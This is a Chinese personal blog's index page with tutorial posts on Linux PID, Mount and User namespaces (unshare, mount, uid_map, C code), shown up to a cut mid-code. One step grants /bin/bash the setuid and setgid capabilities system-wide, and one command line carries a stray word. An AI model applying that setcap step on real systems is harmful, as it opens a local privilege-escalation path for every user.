<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="BruceFan&#39;s Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="BruceFan&#39;s Blog">
<meta property="og:locale">
<meta property="article:author" content="Bruce Fan">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>BruceFan's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">BruceFan's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">so文件的.init_array段中添加代码</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-07-29 21:05:40" itemprop="dateCreated datePublished" datetime="2020-07-29T21:05:40+08:00">2020-07-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 11:15:24" itemprop="dateModified" datetime="2020-11-12T11:15:24+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>其实之前的Android linker文章中有提到，但是没有实际写过时间长了就忘记了。so文件是一个elf格式的文件，在so被加载之前，会执行init段的代码。在结束的时候，会执行fini段的代码。这个技术一般是用来解密加壳文件的，我遇到的场景是加沙箱，下面就介绍一下实现方法。  </p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/07/09/PID-namespace/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/09/PID-namespace/" class="post-title-link" itemprop="url">PID namespace</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-07-09 11:32:17" itemprop="dateCreated datePublished" datetime="2020-07-09T11:32:17+08:00">2020-07-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>PID namespace用来隔离进程的PID空间，使得不同PID namespace中的进程号可以重复且互不影响。Linux下的每个进程都有一个对应的/proc/pid目录，该目录包含了进程相关的信息。对于一个PID namespace，/proc目录只包含当前namespace和它所有子孙后代namespace里的进程信息。创建一个新的PID namespace后，需要挂载/proc文件系统才能让子进程中top、ps等依赖/proc文件系统的命令正常工作。<br>1.命令行使用<br>下面通过例子演示挂载/proc文件系统的作用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ echo $$</span><br><span class="line">9501</span><br><span class="line">$ readlink &#x2F;proc&#x2F;$$&#x2F;ns&#x2F;pid</span><br><span class="line">pid:[4026531836]</span><br><span class="line">$ sudo unshare --pid --mount --fork &#x2F;bin&#x2F;bash</span><br><span class="line"># readlink &#x2F;proc&#x2F;$$&#x2F;ns&#x2F;pid</span><br><span class="line">pid:[4026531836]</span><br><span class="line"># ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">11178 pts&#x2F;0    00:00:00 sudo</span><br><span class="line">11180 pts&#x2F;0    00:00:00 unshare</span><br><span class="line">11183 pts&#x2F;0    00:00:00 bash</span><br><span class="line">11211 pts&#x2F;0    00:00:00 ps</span><br><span class="line"># echo $$</span><br><span class="line">1</span><br><span class="line"># ps 1</span><br><span class="line">  PID TTY      STAT   TIME COMMAND</span><br><span class="line">    1 ?        Ss     0:02 &#x2F;sbin&#x2F;init splash</span><br></pre></td></tr></table></figure>
<p>在创建新PID namespace后，当前bash进程的pid变成了1，但是通过ps命令可以看出进程信息使用的还是旧PID namespace中的，因此readlink读取的PID namespace信息是/sbin/init进程的，所以PID namespace没有变。–mount新建的mount namespace的挂载信息是从旧mount namespace中拷贝过来的，因此需要挂载新的/proc文件系统：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># mount -t proc proc &#x2F;proc</span><br><span class="line"># readlink &#x2F;proc&#x2F;$$&#x2F;ns&#x2F;pid</span><br><span class="line">pid:[4026532726]</span><br><span class="line"># ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">    1 pts&#x2F;0    00:00:00 bash</span><br><span class="line">   26 pts&#x2F;0    00:00:00 ps</span><br></pre></td></tr></table></figure>
<p>现在看到的进程信息和PID namespace就是正确的了。其实unshare命令有一个专门的–mount-proc选项来配合PID namespace创建：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo unshare --pid --mount-proc --fork &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>这样就会在创建PID和Mount namespace之后自动挂载/proc文件系统了。<br>2.代码实现<br>Mount namespace需要特权用户来执行，可以在运行时加sudo，或者可以先创建User namespace映射到root用户再运行。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	flags = <span class="number">0</span>;</span><br><span class="line">	flags |= CLONE_NEWNS; <span class="comment">// Mount namespace</span></span><br><span class="line">	flags |= CLONE_NEWPID; <span class="comment">// PID namespace</span></span><br><span class="line">	<span class="keyword">if</span> (unshare(flags) == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;unshare&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">pid_t</span> cpid = fork();</span><br><span class="line">	<span class="keyword">if</span> (cpid == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (cpid == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;mount&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">string</span> cmd = <span class="string">&quot;bash&quot;</span>;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">		argv[<span class="number">0</span>] = cmd.c_str();</span><br><span class="line">		execvp(<span class="string">&quot;/bin/bash&quot;</span>, (<span class="keyword">char</span>* <span class="keyword">const</span>*)argv);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> state;</span><br><span class="line">	wait(&amp;state);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;child exit\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要用fork创建新进程，因为一个进程创建时所属的PID namespace就确定不变了，如果只用execvp创建的shell还是原进程，不能切换到新的PID namespace。</p>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9442208.html">https://www.cnblogs.com/sparkdev/p/9442208.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/07/08/Mount-namespace/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/08/Mount-namespace/" class="post-title-link" itemprop="url">Mount namespace</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-07-08 21:31:59" itemprop="dateCreated datePublished" datetime="2020-07-08T21:31:59+08:00">2020-07-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>mount namespace稍微简单点，因为PID namesapce需要用到所以就先简单介绍一下。<br>mount namespace是用来隔离文件系统的挂载点，这样进程就只能看到自己的文件系统挂载点。新mount namespace中的挂载点是从调用者所在的mount namespace中拷贝的，但是新mount namespace创建后和原mount namespace就没啥关系了（除了shared subtree的情况），下面通过iso文件的挂载来演示。<br>1.创建所需的路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkdir &#x2F;demo</span><br><span class="line">$ sudo chmod 777 &#x2F;demo</span><br><span class="line">$ cd demo</span><br><span class="line">$ mkdir -p iso1&#x2F;subdir1</span><br><span class="line">$ mkdir -p iso2&#x2F;subdir2</span><br><span class="line">$ mkisofs -o 1.iso .&#x2F;iso1</span><br><span class="line">$ mkisofs -o 2.iso .&#x2F;iso2</span><br></pre></td></tr></table></figure>
<p>再准备两个目录当挂载点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkdir &#x2F;mnt&#x2F;iso1 &#x2F;mnt&#x2F;iso2</span><br></pre></td></tr></table></figure>
<p>2.在当前shell执行挂载操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount 1.iso &#x2F;mnt&#x2F;iso1</span><br></pre></td></tr></table></figure>
<p>3.打开一个新shell，新shell和旧shell在同一个mount namesapce中，在新shell中执行unshare命令，新建mount namespace：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo unshare -m</span><br></pre></td></tr></table></figure>
<p>在两个shell中分别执行readlink命令查看当前进程所在的mount namespace：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readlink &#x2F;proc&#x2F;$$&#x2F;ns&#x2F;mnt</span><br></pre></td></tr></table></figure>
<p>可以看到两个shell的mount namespace是不同的。此时查看两个shell的挂载点信息是相同的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mount | grep 1.iso</span><br><span class="line">&#x2F;demo&#x2F;1.iso on &#x2F;mnt&#x2F;iso1 type iso9660 (ro,relatime,nojoliet,check&#x3D;s,map&#x3D;n,blocksize&#x3D;2048)</span><br></pre></td></tr></table></figure>
<p>4.在新shell中执行一些mount和umount操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># mount 2.iso &#x2F;mnt&#x2F;iso2</span><br><span class="line"># umount &#x2F;mnt&#x2F;iso1</span><br></pre></td></tr></table></figure>
<p>再查看两个shell中的挂载点信息就不一样了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mount | grep iso</span><br><span class="line">&#x2F;demo&#x2F;2.iso on &#x2F;mnt&#x2F;iso2 type iso9660 (ro,relatime,nojoliet,check&#x3D;s,map&#x3D;n,blocksize&#x3D;2048)</span><br></pre></td></tr></table></figure>
<p>这里就先介绍命令使用的方法，代码实现比较简单，和PID namespace合在一起了。</p>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9424649.html">https://www.cnblogs.com/sparkdev/p/9424649.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/07/06/User-namespace/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/06/User-namespace/" class="post-title-link" itemprop="url">User namespace</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-07-06 15:58:30" itemprop="dateCreated datePublished" datetime="2020-07-06T15:58:30+08:00">2020-07-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>接下来打算逐个学习一下Linux namespace的作用和用法，顺序不一定科学，随心随性学习法。。第一个学的是User namespace，先学这个是因为在看Chrome沙箱的时候，用到的就是User namespace。<br>1.命令行使用<br>通过unshare命令可以启动所有的7种namespace，启动user namespace：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fanrong@fanrong $ unshare --user -r &#x2F;bin&#x2F;bash</span><br><span class="line">root@fanrong # </span><br></pre></td></tr></table></figure>
<p>通过-r选项，将新user namespace中的root用户映射到外面的fanrong用户。<br>接下来介绍一下映射，使用id命令查看当前用户的ID，使用unshare命令创建一个新user namespace：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fanrong@fanrong $ unshare --user &#x2F;bin&#x2F;bash</span><br><span class="line">nobody@fanrong $ id</span><br><span class="line">uid&#x3D;65534(nobody) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)</span><br></pre></td></tr></table></figure>
<p>看到用户和组变成了nobody和nogroup，这是因为没有对父user namespace和子user namespace的ID进行映射。下面我们来进行手动映射，映射ID的方法就是添加映射信息到/proc/NEW_PID/uid_map和/proc/NEW_PID/gid_map文件中。配置信息的格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inside-ID outside-ID length</span><br></pre></td></tr></table></figure>
<blockquote>
<p>例如，<code>0 1000 500</code>这条配置就表示子user namespace中的0<del>500映射到父user namespace中的1000</del>1500。</p>
</blockquote>
<p>在新的user namespace中查看当前进程ID：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nobody@fanrong $ echo $$</span><br><span class="line">4754</span><br></pre></td></tr></table></figure>
<p>新打开一个终端，将映射配置写入上面说的两个文件。虽然这两个文件都是fanrong用户的，但是如果直接往里写会报Operation not permitted，根本的原因在于当前的 bash 进程没CAP_SETUID和CAP_SETGID的权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fanrong@fanrong $ Bazel cat &#x2F;proc&#x2F;$$&#x2F;status | egrep &#39;Cap(Inh|Prm|Eff)&#39;</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000000000000000</span><br><span class="line">CapEff:	0000000000000000</span><br></pre></td></tr></table></figure>
<p>为/bin/bash添加相关的capabilities：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fanrong@fanrong $ sudo setcap cap_setgid,cap_setuid+ep &#x2F;bin&#x2F;bash</span><br><span class="line">fanrong@fanrong $ exec bash</span><br><span class="line">fanrong@fanrong $ cat &#x2F;proc&#x2F;$$&#x2F;status | egrep &#39;Cap(Inh|Prm|Eff)&#39;</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	00000000000000c0</span><br><span class="line">CapEff:	00000000000000c0</span><br></pre></td></tr></table></figure>
<p>再向文件中写入映射配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fanrong@fanrong $ echo &#39;0 1000 500&#39; &gt; &#x2F;proc&#x2F;4754&#x2F;uid_map</span><br><span class="line">fanrong@fanrong $ echo &#39;0 1000 500&#39; &gt; &#x2F;proc&#x2F;4754&#x2F;gid_map</span><br></pre></td></tr></table></figure>
<p>回到新user namespace的终端，重新加载bash:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nobody@fanrong $ exec bash</span><br><span class="line">root@fanrong # id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),65534(nogroup)</span><br></pre></td></tr></table></figure>
<p>2.代码实现<br>代码实现是按照上面映射的方法进行实现的，先执行unshare，再向当前进程的gid_map和uid_map写入映射配置，但是有个问题是运行之后只有uid映射了，gid没有映射，不知道什么原因。需要向setgroups写入<code>deny</code>，gid才能正确映射。完整代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o userns userns.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	flags = <span class="number">0</span>;</span><br><span class="line">	flags |= CLONE_NEWUSER;</span><br><span class="line">	<span class="keyword">if</span> (unshare(flags) == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span 